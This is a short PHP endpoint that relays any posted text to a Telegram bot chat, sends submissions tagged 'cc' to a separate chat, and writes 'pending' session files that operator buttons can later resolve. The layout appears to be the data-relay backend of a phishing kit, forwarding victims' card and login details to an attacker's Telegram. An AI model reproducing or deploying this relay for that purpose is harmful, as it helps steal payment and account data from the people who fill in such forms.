<?php
header('Content-Type: application/json');
require_once __DIR__ . '/config.php';

$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);

if (empty($data['text'])) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'missing text']);
    exit;
}

// Crear sesión si viene session_id
if (!empty($data['session_id'])) {
    $sid = preg_replace('/[^a-zA-Z0-9_\-]/', '', $data['session_id']);
    $dir = __DIR__ . '/sessions/';
    if (!is_dir($dir)) mkdir($dir, 0755, true);
    file_put_contents($dir . $sid . '.json', json_encode(['status' => 'pending']));
}

$action = $data['action'] ?? '';
$chatId = ($action === 'cc') ? TG_CHAT_CC : TG_CHAT;

$tgPayload = [
    'chat_id'    => $chatId,
    'text'       => $data['text'],
    'parse_mode' => 'HTML',
];

if (!empty($data['buttons'])) {
    $tgPayload['reply_markup'] = ['inline_keyboard' => $data['buttons']];
}

$ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage');
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => json_encode($tgPayload),
    CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_TIMEOUT        => 8,
]);
curl_exec($ch);
curl_close($ch);

echo json_encode(['ok' => true]);
